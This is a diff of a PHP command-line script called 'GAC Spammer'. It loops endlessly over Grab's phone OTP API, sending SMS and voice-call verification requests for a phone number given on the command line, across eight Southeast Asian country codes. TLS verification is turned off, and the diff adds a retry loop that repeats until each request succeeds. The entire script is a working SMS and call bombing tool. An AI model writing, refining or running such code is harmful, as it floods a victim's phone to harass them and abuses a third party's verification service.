@@ -10,31 +10,36 @@ if (!isset($argv[1]) || (isset($argv[2]) && !in_array(strtoupper($argv[2]), ["SM
 $countries = ["MY", "SG", "ID", "TH", "VN", "KH", "PH", "MM"];
 shuffle($countries);
 
-$ch = curl_init("https://api.grab.com/grabid/v1/phone/otp");
-curl_setopt_array($ch, [
-	CURLOPT_RETURNTRANSFER => true,
-	CURLOPT_SSL_VERIFYPEER => false
-]);
-
 if (function_exists("cli_set_process_title")) cli_set_process_title("GAC Spammer - 0 Hits");
-
-$last_success = ["SMS" => 0, "CALL" => 0];
 
 $i = 0;
 while (true) {
 	foreach ($countries as $countryCode) {
-		foreach (["SMS", "CALL"] as $method) {
-			if (strtoupper($argv[2]) === "ALL" || strtoupper($argv[2]) === $method) {
-				curl_setopt($ch, CURLOPT_POSTFIELDS, "method=".$method."&countryCode=".$countryCode."&phoneNumber=".$argv[1]."&templateID=&numDigits=4");
-				curl_exec($ch);
-				if (curl_getinfo($ch, CURLINFO_HTTP_CODE) === 200) {
-					echo date("[H:i:s]")." ".$method." OTP Requested.\n";
-					if (function_exists("cli_set_process_title")) cli_set_process_title("GAC Spammer - ".number_format(++$i)." Hits");
+		$success = false;
+		while (!$success) {
+			foreach (["SMS", "CALL"] as $method) {
+				if (strtoupper($argv[2]) === "ALL" || strtoupper($argv[2]) === $method) {
+					$result = @file_get_contents("https://api.grab.com/grabid/v1/phone/otp", false, stream_context_create([
+						"http" => [
+							"method" => "POST",
+							"header" => "Content-type: application/x-www-form-urlencoded",
+							"content" => "method=".$method."&countryCode=".$countryCode."&phoneNumber=".$argv[1]."&templateID=&numDigits=4"
+						],
+						"ssl" => [
+							"verify_peer" => false,
+							"verify_peer_name" => false
+						]
+					]));
+					if ($result) {
+						echo date("[H:i:s]")." ".$method." OTP Requested.\n";
+						if (function_exists("cli_set_process_title")) cli_set_process_title("GAC Spammer - ".++$i." Hits");
+						$success = true;
+					}
 				}
 			}
+			sleep(1);
 		}
 	}
-	sleep(1);
 }
 
 ?>
